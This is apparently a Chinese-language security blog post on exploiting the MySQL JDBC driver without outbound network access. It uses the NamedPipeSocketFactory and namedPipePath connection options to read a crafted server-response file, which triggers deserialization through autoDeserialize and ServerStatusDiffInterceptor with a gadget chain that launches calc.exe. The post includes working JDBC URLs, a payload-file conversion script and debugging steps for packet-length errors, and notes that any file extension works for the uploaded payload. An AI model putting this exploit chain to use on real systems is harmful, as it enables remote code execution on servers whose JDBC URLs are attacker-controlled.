# JDBC 不出网利用

#### socketFactory 驱动

javamysql驱动存在sockerfactory选项

```java
        this.socketFactoryClassName = new StringConnectionProperty("socketFactory", StandardSocketFactory.class.getName(), Messages.getString("ConnectionProperties.socketFactory"), "3.0.3", CONNECTION_AND_AUTH_CATEGORY, 4);

```

接受一个类的名字

在创建mysqlIO 的时候调用了它

mysqlIO的调用方法如下

​`public MysqlIO(String host, int port, Properties props,
        String socketFactoryClassName, MySQLConnection conn,
        int socketTimeout, int useBufferRowSizeThreshold)`​

在初始化MysqlIO的时候createSocketFactory会被调用，用于提供一个客户端和服务器连接的方式

​`NamedPipeSocketFactory`​类中的connect方法中看到，它使用了NamedPipeSocket并传入一个path作为参数，并且将实例化后的对象用作一个与服务器交互的通道

在NamedPipeSocket的构造方法中发现，它用`RandomAccessFile`​打开了一个文件，并且最终使用这个文件流作为与服务器连接的IO通道

```java
    class NamedPipeSocket extends Socket {
        private boolean isClosed = false;
        private RandomAccessFile namedPipeFile;

        NamedPipeSocket(String filePath) throws IOException {
            if (filePath != null && filePath.length() != 0) {
                this.namedPipeFile = new RandomAccessFile(filePath, "rw");
            } else {
                throw new IOException(Messages.getString("NamedPipeSocketFactory.4"));
            }
        }

        public synchronized void close() throws IOException {
            this.namedPipeFile.close();
            this.isClosed = true;
        }
```

这里就是利用读取的这个文件作为我们的恶意数据流输入

在jdbc链接参数处 可控 

​`public static final String NAMED_PIPE_PROP_NAME = "namedPipePath"; //`​

‍

### 准备流量包

现在本地进行复现 利用某条cc链进行测试

```JAVA

import java.sql.*;

public class JDBCAttack {
    public static void main(String[] args) throws Exception {
	        String url = "jdbc:mysql://127.0.0.1:8888/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==";
	//        String url = "jdbc:mysql://127.0.0.1:5556/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=base64ZGVzZXJfQ0MzMV9jYWxjLmV4ZQ==";
        try {
            Class.forName("com.mysql.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

‍

‍

#### 构造流量包

遇到问题

总是报错

```JAVA
 protected final Buffer readPacket() throws SQLException {
        try {
            int lengthRead = this.readFully(this.mysqlInput, this.packetHeaderBuf, 0, 4);
            if (lengthRead < 4) {
                this.forceClose();
                throw new IOException(Messages.getString("MysqlIO.1"));
            } else {
                int packetLength = (this.packetHeaderBuf[0] & 255) + ((this.packetHeaderBuf[1] & 255) << 8) + ((this.packetHeaderBuf[2] & 255) << 16);
                if (packetLength > this.maxAllowedPacket) {
                    throw new PacketTooBigException((long)packetLength, (long)this.maxAllowedPacket);
                } else {
```

Packet for query is too large

跟进调试发现在

mysqlio.class  line 339 在读取流量包作为输入的时候会进行大小判断

​` private int maxAllowedPacket = 1048576;`​

‍

‍

遇到报错

Communications link failure  
The driver has not received any packets from the server.  
Caused by: java.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.

```JAVA
public Socket connect(String host, int portNumber, Properties props) throws SocketException, IOException {
        String namedPipePath = props.getProperty("namedPipePath");
        if (namedPipePath == null) {
            namedPipePath = "\\\\.\\pipe\\MySQL";
        } else if (namedPipePath.length() == 0) {
            throw new SocketException(Messages.getString("NamedPipeSocketFactory.2") + "namedPipePath" + Messages.getString("NamedPipeSocketFactory.3"));
        }

        this.namedPipeSocket = new NamedPipeSocket(namedPipePath);
        return this.namedPipeSock
```

报错点 

```JAVA
        this.io.doHandshake(this.user, this.password, this.database);

```

发现读取文件内容为空

修改代码尝试看看能不能读取文件内容

```JAVA
  try (FileInputStream fis = new FileInputStream(pipeFile)) {
            byte[] buffer = new byte[16];
            int readBytes = fis.read(buffer);
            if (readBytes == -1) {
                System.out.println("文件为空，无法读取数据");
            } else {
                System.out.print("文件读取到的字节（前 " + readBytes + " 个）：");
                for (int i = 0; i < readBytes; i++) {
                    System.out.printf("%02X ", buffer[i]);
                }
                System.out.println();
            }
        } catch (IOException e) {
            System.out.println("读取文件时发生错误:");
            e.printStackTrace();
            return;
        }
```

发现真无法读取文件

采用绝对路径设置权限后成功读取

 但是还是报错

mysqlio.class  line 339 在读取流量包作为输入的时候会进行大小判断

​`  int packetLength = (this.packetHeaderBuf[0] & 255) + ((this.packetHeaderBuf[1] & 255) << 8) + ((this.packetHeaderBuf[2] & 255) << 16);`​

判断大小逻辑如下

读取内容为 52 -51 -78 -95

修改逻辑后报错显示

文件读取到的字节（前 3 个）：34 CD B2  
计算得到的 packetLength: 11717940  
当前 socketFactory: null  
数据库连接失败!  
com.mysql.jdbc.PacketTooBigException: Packet for query is too large (11717940 > 1048576).

发现确实是前三个字节有问题

修改前三个字节后 成功攻击

‍

注意

不出网的用户名需要与出网的时候用户名一致（如果用错误的用户名，打失败了，用户名改对也无法成功，需要重新来一次）

‍

‍

### 思考

或许是导出的方法不对  不能用直接导出的http包 因为 pcap包里肯定在头部添加了一些字节作为大小类型等判断

考虑直接导出raw原始数据流 然后 修改成 数据包

编写脚本

```JAVA
with open("2.txt", "r", encoding="utf-8") as f:
    hex_data = f.read()
hex_data = hex_data.replace('\n', '').replace(' ', '')# 转换为二进制
raw_bytes = bytes.fromhex(hex_data)# 保存为文件
with open("x.pcap", "wb") as f:
    f.write(raw_bytes)
    print("raw 数据已保存到 文件")
```

利用java-chains 直接使用

```JAVA
import java.sql.Connection;
import java.sql.DriverManager;

public class FIleDemo {
    public static void main(String[] args) throws Exception{
        String driver = "com.mysql.jdbc.Driver";
        String user = "df346cc";
        String password = "root";
        String DB_URL = "jdbc:mysql://xxxx/mysql?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=" + user + "&password=" + password +"&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory" + "&namedPipePath=C:\\Users\\17657\\Desktop\\soft\\x.pcap" ;;
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    }
}
```

成功

‍

‍

思考 如何对于上传文件有后缀要求   则无法上传响应文件 反正读取的是里边是数据流  猜测 跟后缀名没有关系

‍

将文件后缀修改为 txt   php 等形式发现都可以 使用 对后缀名无要求

‍
